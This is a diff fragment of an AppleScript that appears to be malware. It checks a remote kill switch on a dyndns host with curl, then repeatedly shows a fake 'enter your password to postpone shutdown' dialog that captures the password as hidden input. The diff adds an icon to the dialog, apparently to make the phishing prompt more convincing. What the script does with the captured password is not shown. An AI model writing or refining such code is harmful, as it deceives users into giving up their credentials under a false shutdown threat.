@@ -7,7 +7,6 @@ try
 end try
 
 try
-	set killswitch to ""
 	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
 	set killswitch to (characters 1 through -1 of result) as text -- Get IP
 	if killswitch = "kill" then
@@ -20,7 +19,7 @@ end try
 try
 	
 	repeat
-		set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
+		set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" with icon (path to resource "icon.icns") default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
 		set passwd to text returned of quest
 		if gave up of quest = true then -- If the user doesn't enter a password:
 			try
